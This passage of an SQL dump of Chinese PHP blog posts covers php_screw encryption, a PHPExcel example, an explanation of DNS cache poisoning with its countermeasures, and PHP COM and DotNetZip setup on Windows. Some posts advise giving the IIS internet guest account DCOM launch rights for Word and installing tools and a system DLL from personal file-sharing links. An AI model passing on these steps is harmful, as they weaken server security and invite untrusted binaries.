&lt;/p&gt;&lt;p&gt;cd /var/www/&lt;/p&gt;&lt;p&gt;screw test.php&lt;/p&gt;&lt;p&gt;我们加密后，现在目录下的test.php文件就是我们已经加密的了。而源文件被改名为test.php.screw存放了。 &lt;/p&gt;&lt;p&gt;我们现在再测试一下test.php，看看能否正常使用？速度如何？ &lt;/p&gt;&lt;p&gt;我比较了一下，加密前后的速度大概一样，基本没有太多的损失。&lt;/p&gt;&lt;p&gt;3批处理加密文件&lt;/p&gt;&lt;p&gt;在debian, apache2, php5上测试过对.html文件加密后，能正确解析； &lt;/p&gt;&lt;p&gt;php_screw如何对当前目录下，对目录下包含的文件，以及包含目录下的文件进行整体加密&lt;/p&gt;&lt;p&gt;find ./ -name &amp;quot;*.php&amp;quot; －print|xargs -n1 screw //加密所有的.php文件&lt;/p&gt;&lt;p&gt;find ./ -name &amp;quot;*.screw&amp;quot; -print/xargs -n1 rm //删除所有的.php源文件的备份文件&lt;/p&gt;&lt;p&gt;这样在当前目录下的所有.php文件就全部背加密了&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考文章：&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/zqlee1216/article/details/4371477&quot;&gt;http://blog.csdn.net/zqlee1216/article/details/4371477&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://www.cnblogs.com/keheng/articles/2496970.html&quot;&gt;http://www.cnblogs.com/keheng/articles/2496970.html&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386857103),
(71, 71, '&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;PHP导出Excel的强大类库 - PHPExcel&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;官网：&lt;a target=&quot;_blank&quot; href=&quot;http://phpexcel.codeplex.com/&quot;&gt;http://phpexcel.codeplex.com/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;说明：官网的完整库太大了，网上有一个精简版的类库&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;精简版下载地址：&lt;a target=&quot;_blank&quot; href=&quot;http://pan.baidu.com/share/link?shareid=184539&amp;amp;uk=704879932&quot;&gt;http://pan.baidu.com/share/link?shareid=184539&amp;amp;uk=704879932&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;使用备忘：&lt;/p&gt;精简版压缩包里有一个index.php的使用实例，但是例子比较简单，而且只有生成保持你文件的实例，下面的代码是一个比较全面的介绍&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;/** \r\n* 如果使用 Excel5 ，输出的内容应该是GBK编码。 \r\n*/   \r\nrequire_once &#039;PHPExcel.php&#039;;   \r\n             \r\n// uncomment   \r\n////require_once &#039;PHPExcel/Writer/Excel5.php&#039;; // 用于其他低版本xls   \r\n// or   \r\n////require_once &#039;PHPExcel/Writer/Excel2007.php&#039;; // 用于 excel-2007 格式   \r\n             \r\n// 创建一个处理对象实例   \r\n$objExcel = new PHPExcel();   \r\n             \r\n// 创建文件格式写入对象实例, uncomment   \r\n////$objWriter = new PHPExcel_Writer_Excel5($objExcel); // 用于其他版本格式   \r\n// or   \r\n////$objWriter = new PHPExcel_Writer_Excel2007($objExcel); // 用于 2007 格式   \r\n//$objWriter-&amp;gt;setOffice2003Compatibility(true);   \r\n             \r\n//*************************************   \r\n//设置文档基本属性   \r\n$objProps = $objExcel-&amp;gt;getProperties();   \r\n$objProps-&amp;gt;setCreator(&quot;Zeal Li&quot;);   \r\n$objProps-&amp;gt;setLastModifiedBy(&quot;Zeal Li&quot;);   \r\n$objProps-&amp;gt;setTitle(&quot;Office XLS Test Document&quot;);   \r\n$objProps-&amp;gt;setSubject(&quot;Office XLS Test Document, Demo&quot;);   \r\n$objProps-&amp;gt;setDescription(&quot;Test document, generated by PHPExcel.&quot;);   \r\n$objProps-&amp;gt;setKeywords(&quot;office excel PHPExcel&quot;);   \r\n$objProps-&amp;gt;setCategory(&quot;Test&quot;);   \r\n             \r\n//*************************************   \r\n//设置当前的sheet索引，用于后续的内容操作。   \r\n//一般只有在使用多个sheet的时候才需要显示调用。   \r\n//缺省情况下，PHPExcel会自动创建第一个sheet被设置SheetIndex=0   \r\n$objExcel-&amp;gt;setActiveSheetIndex(0);   \r\n             \r\n$objActSheet = $objExcel-&amp;gt;getActiveSheet();   \r\n             \r\n//设置当前活动sheet的名称   \r\n$objActSheet-&amp;gt;setTitle(&#039;测试Sheet&#039;);   \r\n             \r\n//*************************************   \r\n//设置单元格内容   \r\n//   \r\n//由PHPExcel根据传入内容自动判断单元格内容类型   \r\n$objActSheet-&amp;gt;setCellValue(&#039;A1&#039;, &#039;字符串内容&#039;); // 字符串内容   \r\n$objActSheet-&amp;gt;setCellValue(&#039;A2&#039;, 26); // 数值   \r\n$objActSheet-&amp;gt;setCellValue(&#039;A3&#039;, true); // 布尔值   \r\n$objActSheet-&amp;gt;setCellValue(&#039;A4&#039;, &#039;=SUM(A2:A2)&#039;); // 公式   \r\n             \r\n//显式指定内容类型   \r\n$objActSheet-&amp;gt;setCellValueExplicit(&#039;A5&#039;, &#039;847475847857487584&#039;,   \r\nPHPExcel_Cell_DataType::TYPE_STRING);   \r\n             \r\n//合并单元格   \r\n$objActSheet-&amp;gt;mergeCells(&#039;B1:C22&#039;);   \r\n             \r\n//分离单元格   \r\n$objActSheet-&amp;gt;unmergeCells(&#039;B1:C22&#039;);   \r\n             \r\n//*************************************   \r\n//设置单元格样式   \r\n//   \r\n             \r\n//设置宽度   \r\n$objActSheet-&amp;gt;getColumnDimension(&#039;B&#039;)-&amp;gt;setAutoSize(true);   \r\n$objActSheet-&amp;gt;getColumnDimension(&#039;A&#039;)-&amp;gt;setWidth(30);   \r\n             \r\n$objStyleA5 = $objActSheet-&amp;gt;getStyle(&#039;A5&#039;);   \r\n             \r\n//设置单元格内容的数字格式。   \r\n//   \r\n//如果使用了 PHPExcel_Writer_Excel5 来生成内容的话，   \r\n//这里需要注意，在 PHPExcel_Style_NumberFormat 类的 const 变量定义的   \r\n//各种自定义格式化方式中，其它类型都可以正常使用，但当setFormatCode   \r\n//为 FORMAT_NUMBER 的时候，实际出来的效果被没有把格式设置为&quot;0&Prime;。需要   \r\n//修改 PHPExcel_Writer_Excel5_Format 类源代码中的 getXf($style) 方法，   \r\n//在 if ($this-&amp;gt;_BIFF_version == 0&times;0500) { （第363行附近）前面增加一   \r\n//行代码:   \r\n//if($ifmt === &#039;0&#039;) $ifmt = 1;   \r\n//   \r\n//设置格式为PHPExcel_Style_NumberFormat::FORMAT_NUMBER，避免某些大数字   \r\n//被使用科学记数方式显示，配合下面的 setAutoSize 方法可以让每一行的内容   \r\n//都按原始内容全部显示出来。   \r\n$objStyleA5   \r\n-&amp;gt;getNumberFormat()   \r\n-&amp;gt;setFormatCode(PHPExcel_Style_NumberFormat::FORMAT_NUMBER);   \r\n             \r\n//设置字体   \r\n$objFontA5 = $objStyleA5-&amp;gt;getFont();   \r\n$objFontA5-&amp;gt;setName(&#039;Courier New&#039;);   \r\n$objFontA5-&amp;gt;setSize(10);   \r\n$objFontA5-&amp;gt;setBold(true);   \r\n$objFontA5-&amp;gt;setUnderline(PHPExcel_Style_Font::UNDERLINE_SINGLE);   \r\n$objFontA5-&amp;gt;getColor()-&amp;gt;setARGB(&#039;FF999999&#039;);   \r\n             \r\n//设置对齐方式   \r\n$objAlignA5 = $objStyleA5-&amp;gt;getAlignment();   \r\n$objAlignA5-&amp;gt;setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_RIGHT);   \r\n$objAlignA5-&amp;gt;setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);   \r\n             \r\n//设置边框   \r\n$objBorderA5 = $objStyleA5-&amp;gt;getBorders();   \r\n$objBorderA5-&amp;gt;getTop()-&amp;gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);   \r\n$objBorderA5-&amp;gt;getTop()-&amp;gt;getColor()-&amp;gt;setARGB(&#039;FFFF0000&#039;); // color   \r\n$objBorderA5-&amp;gt;getBottom()-&amp;gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);   \r\n$objBorderA5-&amp;gt;getLeft()-&amp;gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);   \r\n$objBorderA5-&amp;gt;getRight()-&amp;gt;setBorderStyle(PHPExcel_Style_Border::BORDER_THIN);   \r\n             \r\n//设置填充颜色   \r\n$objFillA5 = $objStyleA5-&amp;gt;getFill();   \r\n$objFillA5-&amp;gt;setFillType(PHPExcel_Style_Fill::FILL_SOLID);   \r\n$objFillA5-&amp;gt;getStartColor()-&amp;gt;setARGB(&#039;FFEEEEEE&#039;);   \r\n             \r\n//从指定的单元格复制样式信息.   \r\n$objActSheet-&amp;gt;duplicateStyle($objStyleA5, &#039;B1:C22&#039;);   \r\n             \r\n//*************************************   \r\n//添加图片   \r\n$objDrawing = new PHPExcel_Worksheet_Drawing();   \r\n$objDrawing-&amp;gt;setName(&#039;ZealImg&#039;);   \r\n$objDrawing-&amp;gt;setDescription(&#039;Image inserted by Zeal&#039;);   \r\n$objDrawing-&amp;gt;setPath(&#039;./zeali.net.logo.gif&#039;);   \r\n$objDrawing-&amp;gt;setHeight(36);   \r\n$objDrawing-&amp;gt;setCoordinates(&#039;C23&#039;);   \r\n$objDrawing-&amp;gt;setOffsetX(10);   \r\n$objDrawing-&amp;gt;setRotation(15);   \r\n$objDrawing-&amp;gt;getShadow()-&amp;gt;setVisible(true);   \r\n$objDrawing-&amp;gt;getShadow()-&amp;gt;setDirection(36);   \r\n$objDrawing-&amp;gt;setWorksheet($objActSheet);   \r\n             \r\n//添加一个新的worksheet   \r\n$objExcel-&amp;gt;createSheet();   \r\n$objExcel-&amp;gt;getSheet(1)-&amp;gt;setTitle(&#039;测试2&#039;);   \r\n             \r\n//保护单元格   \r\n$objExcel-&amp;gt;getSheet(1)-&amp;gt;getProtection()-&amp;gt;setSheet(true);   \r\n$objExcel-&amp;gt;getSheet(1)-&amp;gt;protectCells(&#039;A1:C22&#039;, &#039;PHPExcel&#039;);   \r\n             \r\n//*************************************   \r\n//输出内容   \r\n//   \r\n$outputFileName = &quot;output.xls&quot;;   \r\n//到文件   \r\n////$objWriter-&amp;gt;save($outputFileName);   \r\n//or   \r\n//到浏览器   \r\n////header(&quot;Content-Type: application/force-download&quot;);   \r\n////header(&quot;Content-Type: application/octet-stream&quot;);   \r\n////header(&quot;Content-Type: application/download&quot;);   \r\n////header(&#039;Content-Disposition:inline;filename=&quot;&#039;.$outputFileName.&#039;&quot;&#039;);   \r\n////header(&quot;Content-Transfer-Encoding: binary&quot;);   \r\n////header(&quot;Expires: Mon, 26 Jul 1997 05:00:00 GMT&quot;);   \r\n////header(&quot;Last-Modified: &quot; . gmdate(&quot;D, d M Y H:i:s&quot;) . &quot; GMT&quot;);   \r\n////header(&quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&Prime;);   \r\n////header(&quot;Pragma: no-cache&quot;);   \r\n////$objWriter-&amp;gt;save(&#039;php://output&#039;);&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;br /&gt;参考文章：&lt;a target=&quot;_blank&quot; href=&quot;http://sjolzy.cn/PHP-generated-excel-useful-powerful-php-excel-library.html&quot;&gt;http://sjolzy.cn/PHP-generated-excel-useful-powerful-php-excel-library.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386857273),
(72, 72, '&lt;p&gt;DNS污染，又称为&lt;strong&gt;域名服务器缓存污染&lt;/strong&gt;（DNS cache pollution）或&lt;strong&gt;域名服务器缓存投毒&lt;/strong&gt;（DNS cache poisoning）&lt;/p&gt;&lt;p&gt;是指一些刻意制造或无意中制造出来的域名服务器&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%B0%81%E5%8C%85&quot; title=&quot;分组&quot; class=&quot;mw-redirect&quot;&gt;分组&lt;/a&gt;，把域名指往不正确的IP地址。一般来说，外间在&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%AF%E7%B6%B2&quot; title=&quot;互联网&quot; class=&quot;mw-redirect&quot;&gt;互联网&lt;/a&gt;上一般都有可信赖的&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8&quot; title=&quot;域名服务器&quot; class=&quot;mw-redirect&quot;&gt;域名服务器&lt;/a&gt;，但为减免网络上的交通，一般的域名都会把外间的域名服务器数据暂存起来，待下次有其他机器要求解析域名时，可以立即提供服务。一旦有关网域的局域域名服务器的缓存受到污染，就会把网域内的电脑导引往错误的服务器或服务器的网址。&lt;/p&gt;&lt;p&gt;域名服务器缓存污染可能是通过域名服务器软件上的设计错误而产生，但亦可能由别有用心者通过研究&lt;a href=&quot;http://zh.wikipedia.org/w/index.php?title=%E9%96%8B%E6%94%BE%E6%9E%B6%E6%A7%8B&amp;amp;action=edit&amp;amp;redlink=1&quot; class=&quot;new&quot; title=&quot;开放架构（页面不存在）&quot;&gt;开放架构&lt;/a&gt;的域名服务器系统来利用当中的漏洞。&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;t0&quot;&gt;&lt;/a&gt;&lt;span class=&quot;mw-headline&quot; id=&quot;.E7.B7.A9.E5.AD.98.E6.B1.A1.E6.9F.93.E6.94.BB.E6.93.8A&quot;&gt;缓存污染攻击&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;一般来说，一部连上了互联网的电脑都会使用&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%AF%E7%B6%B2%E6%9C%8D%E5%8B%99%E4%BE%9B%E6%87%89%E5%95%86&quot; title=&quot;互联网服务提供商&quot; class=&quot;mw-redirect&quot;&gt;互联网服务提供商&lt;/a&gt;提供的域名服务器。这个服务器一般只会为供应商的客户来服务，通常都会储蓄起部分客户曾经请求过的域名的缓存。缓存污染攻击就是针对这一种服务器，以影响服务器的用户或下游服务。&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;t1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;mw-headline&quot; id=&quot;.E9.98.B2.E7.81.AB.E9.95.B7.E5.9F.8E.E7.9A.84.E7.B7.A9.E5.AD.98.E6.B1.A1.E6.9F.93.E6.94.BB.E6.93.8A&quot;&gt;防火长城的缓存污染攻击&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;在中国大陆，对于所有经过&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E9%95%B7%E5%9F%8E&quot; title=&quot;防火长城&quot; class=&quot;mw-redirect&quot;&gt;防火长城&lt;/a&gt;的在UDP的53端口上的域名查询进行IDS&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B&quot; title=&quot;入侵检测&quot; class=&quot;mw-redirect&quot;&gt;入侵检测&lt;/a&gt;，一经发现与黑名单关键词相匹配的域名查询请求，其会马上伪装成目标域名的解析服务器给查询者返回虚假结果。由于通常的域名查询没有任何认证机制，而且域名查询通常基于的UDP协议是无连接不可靠的协议，查询者只能接受最先到达的格式正确结果，并丢弃之后的结果。&lt;sup id=&quot;cite_ref-gfw_2-0&quot; class=&quot;reference&quot;&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/DNS%E6%B1%A1%E6%9F%93#cite_note-gfw-2&quot;&gt;[2]&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;ul class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;对于不了解相关知识的网民来说也就是，由于系统默认使用的&lt;a href=&quot;http://zh.wikipedia.org/wiki/ISP&quot; title=&quot;ISP&quot;&gt;ISP&lt;/a&gt;提供的域名查询服务器查询国外的权威服务器时即被防火长城被污染，使其缓存受到污染，因而默认情况下查询ISP的服务器就会获得虚假IP地址；而用户直接查询境外域名查询服务器（比如&lt;a href=&quot;http://zh.wikipedia.org/wiki/Google_Public_DNS&quot; title=&quot;Google Public DNS&quot;&gt;Google Public DNS&lt;/a&gt;）有可能会被防火长城污染，从而在没有任何防范机制的情况下仍然不能获得目标网站正确的IP地址。&lt;sup id=&quot;cite_ref-gfw_2-1&quot; class=&quot;reference&quot;&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/DNS%E6%B1%A1%E6%9F%93#cite_note-gfw-2&quot;&gt;[2]&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;防火长城暂时未对TCP协议下的域名查询进行污染，故现在能通过强制使用TCP协议查询真实的IP地址：Windows下打开&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6&quot; title=&quot;命令提示符&quot; class=&quot;mw-redirect&quot;&gt;命令提示符&lt;/a&gt;，输入nslookup -vc 要查询的域名 境外DNS服务器的IP地址（必须支持TCP协议查询，否则不会返回查询结果），回车后能返回正确的目标服务器IP地址。而现实的情况是，防火长城对于真实的IP地址也可能会采取其它的手段进行封锁，故能否真正访问可能还需要其它&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E7%BF%BB%E5%A2%99&quot; title=&quot;翻墙&quot; class=&quot;mw-redirect&quot;&gt;翻墙&lt;/a&gt;的手段。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 class=&quot;headline-1 bk-sidecatalog-title&quot;&gt;&lt;a name=&quot;t2&quot;&gt;&lt;/a&gt;&lt;span class=&quot;headline-content&quot;&gt;验证DNS污染的办法&lt;/span&gt;&lt;/h2&gt;&lt;div class=&quot;para&quot;&gt;我们在命令行下通过这样一条命令 nslookup 域名 144.223.234.234，即可判断该域名是否被污染，由于144.223.234.234不存在，理应没有任何返回。但我们却得到了一个错误的IP（不确定）。即可证明这个域名已经被DNS污染了。&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;div&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;解决DNS污染方案&lt;/strong&gt;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;1、修改hosts文件，操作系统中Hosts文件的优先级高于DNS服务器，操作系统在访问某个域名时，会先检测HOSTS文件，然后再查询DNS服务器。可以在hosts添加受到污染的DNS地址来解决DNS污染和DNS劫持。&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;2、如果你是Firefox only用户，并且只用Firefox，又懒得折腾，直接打开Firefox的远程DNS解析就行了。在地址栏中输入about:config找到network.proxy.socks_remote_dns一项改成true。&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;3、使用各种SSH加密代理，在加密代理里进行远程DNS解析，或者使用VPN上网。&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;4、通过一些软件编程处理，可以直接忽略返回结果是虚假IP地址的数据包，直接解决DNS污染的问题。&lt;/div&gt;&lt;br /&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;来源：&lt;a target=&quot;_blank&quot; href=&quot;http://zh.wikipedia.org/wiki/DNS%E6%B1%A1%E6%9F%93&quot;&gt;http://zh.wikipedia.org/wiki/DNS%E6%B1%A1%E6%9F%93&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386857433),
(73, 73, '&lt;p&gt;1、首先在windows的&ldquo;服务&rdquo;里面检查COM+服务是否已经启动。如果未启动，请启动它。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;2、检查php目录ext文件夹下面php_com_dotnet.dll是否存在。&lt;/p&gt;&lt;p&gt;说明：php的windows安装包是没有php_com_dotnet.dll文件的，需要下载相应php版本的zip源包 解压之后在ext目录下会有php_com_dotnet.dll，将该文件复制到已安装的php目录的ext目录下&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;3、如果没问题，在php.ini里面加入以下语句：&lt;/p&gt;&lt;p&gt;[PHP_COM_DOTNET]&lt;/p&gt;&lt;p&gt;extension=php_com_dotnet.dll&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;4、php.ini中设置&lt;/p&gt;&lt;p&gt;com.allow_dcom = true&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：如果对于权限要求比较严格的系统像win2003，将php_com_dotnet.dll复制到ext目录下之后，需要解除该文件的锁定并配置相应的用户权限&lt;/span&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386857557),
(74, 74, '&lt;div id=&quot;article_content&quot; class=&quot;article_content&quot;&gt;&lt;p&gt;代码如下，&lt;/p&gt;&lt;p&gt;// 建立一个指向新COM组件的索引 &lt;br /&gt;$word = new COM(&amp;quot;word.application&amp;quot;) or die(&amp;quot;Can&amp;#39;t start Word!&amp;quot;); &lt;br /&gt;// 显示目前正在使用的Word的版本号 &lt;br /&gt;echo &amp;quot;Loading Word, v. {$word-&amp;gt;Version}&lt;br /&gt;&amp;quot;;&lt;/p&gt;&lt;p&gt;exit;&lt;br /&gt;?&amp;gt;&lt;br /&gt;有时候你会得到一个错误，&lt;/p&gt;&lt;p&gt;PHP Fatal error: Uncaught exception &amp;#39;com_exception&amp;#39; with message &amp;#39;Failed&lt;br /&gt;to create COM object `word.application&amp;#39;: 拒绝访问. &amp;#39;&lt;/p&gt;&lt;p&gt;解决方法：&lt;/p&gt;&lt;p&gt;点击开始菜单，运行dcomcnfg&lt;/p&gt;&lt;p&gt;双击&ldquo;组件服务&rdquo;，双击&ldquo;计算机&rdquo;，双击&ldquo;我的电脑&rdquo;，选择&ldquo;DCOM设置&rdquo;&lt;/p&gt;&lt;p&gt;在右边找到需要的COM组件，此例中为&ldquo;Microsoft Word 文档&rdquo;&lt;/p&gt;&lt;p&gt;右击，打开&ldquo;属性&rdquo;菜单，选择&ldquo;安全&rdquo;标签&lt;/p&gt;&lt;p&gt;将&ldquo;启动和激活权限&rdquo;设置成&ldquo;自定义&rdquo;，然后点击编辑&lt;/p&gt;&lt;p&gt;点击&ldquo;添加&rdquo;&amp;gt;&amp;gt;&ldquo;高级&rdquo;&amp;gt;&amp;gt;&ldquo;立即查找&rdquo;，找到&ldquo;internet 来宾用户&rdquo;（默认为IUSER_电脑名），点击&ldquo;确定&rdquo;&lt;/p&gt;&lt;p&gt;将&ldquo;internet 来宾用户&rdquo;的权限设置为本地启动允许，本地激活允许&lt;/p&gt;&lt;p&gt;确定，完成&lt;/p&gt;&lt;p&gt;再次运行上述程序，显示结果为&lt;/p&gt;&lt;p&gt;&amp;quot;Loading Word, v. 11.0&amp;quot;&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt; 补充：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;php.ini中设置&lt;/p&gt;&lt;p&gt;com.allow_dcom = true&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386857633),
(75, 75, '&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;项目功能：web系统为整个项目系统的软件提供自动升级功能&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;具体流程：用户在web系统上传更新文件，然后PHP将文件压缩为zip包，C#编写的客户端服务软件下载该zip包并解压到相应的软件目录进行软件更新&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;功能问题：PHP的zipArchive类只能支持常规zip文件的压缩，而C#客户端需要zip64格式的压缩文件，所以我们这里需要用PHP的COM类来加载DotNetZipLib的Ionic.Zip.ZipFile库&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;/span&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;系统环境&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;系统：windows&lt;/p&gt;&lt;p&gt;php版本：5.3.8&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;说明：如果是php5.3.15之后的版本需要下载php的zip-source包将ext目录的php_com_dotnet.dll扩展加入进去&lt;/span&gt;&lt;/p&gt;&lt;p&gt;DotNetZipLib包下载：&lt;a target=&quot;_blank&quot; href=&quot;http://dotnetzip.codeplex.com/releases/view/68268&quot;&gt;http://dotnetzip.codeplex.com/releases/view/68268&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;第一步 将DotNetZip注册为COM组件&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;用到的工具：&lt;/p&gt;&lt;p&gt;gacutil.exe 下载：&lt;a target=&quot;_blank&quot; href=&quot;http://pan.baidu.com/share/link?shareid=477269&amp;amp;uk=704879932&quot;&gt;http://pan.baidu.com/share/link?shareid=477269&amp;amp;uk=704879932&lt;/a&gt;&lt;/p&gt;&lt;p&gt;regasm.exe 下载：&lt;a target=&quot;_blank&quot; href=&quot;http://pan.baidu.com/share/link?shareid=477270&amp;amp;uk=704879932&quot;&gt;http://pan.baidu.com/share/link?shareid=477270&amp;amp;uk=704879932&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;1、将DotNetZipLib包解压之后zip-v1.9/Release目录下的Ionic.Zip.dll文件复制到C:目录下，下载&lt;/p&gt;&lt;p&gt;2、开始-&amp;gt;运行-&amp;gt;cmd 切换到C盘 &amp;nbsp;&lt;span style=&quot;color:#cc0000&quot;&gt;cd C: &lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;3、安装到GAC &amp;nbsp;gacutil -i Ionic.Zip.dll&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;如果提示缺少MSVCR70.dll请下载&lt;a target=&quot;_blank&quot; href=&quot;http://pan.baidu.com/share/link?shareid=478218&amp;amp;uk=704879932&quot;&gt;http://pan.baidu.com/share/link?shareid=478218&amp;amp;uk=704879932&lt;/a&gt; 解压复制到C:WINDOWSSYSTEM32目录下&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;4、注册到COM组件服务 &amp;nbsp;regasm Ionic.Zip.dll&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;如果下载的regasm.exe注册出错，那进入C:WINDOWSMicrosoft.NETFrameworkv.xxx目录找到RegAsm.exe，用该程序注册COM服务&lt;/span&gt;&lt;/p&gt;&lt;p&gt;完成之后Ionic.Zip.dll就可以当做COM组件服务被PHP的COM类调用了&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;第二步 启用PHP的COM扩展&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考文章：&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/luochuan/article/details/8806689&quot;&gt;http://blog.csdn.net/luochuan/article/details/8806689&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;第&lt;span style=&quot;font-size:18px&quot;&gt;三&lt;/span&gt;步 &lt;span style=&quot;font-size:18px&quot;&gt;编写PHP代码&lt;span style=&quot;font-size:18px&quot;&gt;调用Ionic.Zip.ZipFile类生成ZIP文件&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;创建zip文件 zipfile.php&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n//创建zip文件 \r\ntry { \r\n    echo &#039;&amp;lt;html&amp;gt;&#039;; \r\n    echo &#039;  &amp;lt;head&amp;gt;&#039;; \r\n    echo &#039;  &amp;lt;title&amp;gt;Calling .NET from PHP through COM&amp;lt;/title&amp;gt;&#039;; \r\n    echo &#039;  &amp;lt;meta content=&quot;text/html; charset=GB2312&quot; http-equiv=&quot;Content-Type&quot;&amp;gt;&#039;; \r\n    echo &#039;  &amp;lt;/head&amp;gt;&#039;; \r\n    echo &#039;&amp;lt;body&amp;gt;&#039;; \r\n               \r\n    echo &#039;&amp;lt;h2&amp;gt;Hello!&amp;lt;/h2&amp;gt;&#039; . &quot;&amp;lt;br/&amp;gt;\n&quot;; \r\n    echo &#039;&amp;lt;h4&amp;gt;Trying static method&amp;lt;/h4&amp;gt;&#039; . &quot;&amp;lt;br/&amp;gt;\n&quot;; \r\n 